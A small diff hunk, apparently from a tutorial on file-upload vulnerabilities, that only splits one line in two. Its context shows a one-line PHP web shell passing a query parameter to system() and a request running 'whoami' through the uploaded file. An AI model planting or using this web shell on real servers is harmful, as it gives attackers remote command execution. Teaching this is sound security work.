@@ -7,7 +7,8 @@ Read arbitrary files from the server's filesystem:
 Pass an arbitrary system command via a query parameter:
 
 `<?php echo system($_GET['command']); ?>`
-Once uploaded: `GET /example/exploit.php?command=whoami HTTP/1.1`
+Once uploaded: 
+`GET /example/exploit.php?command=whoami HTTP/1.1`
 
 
 
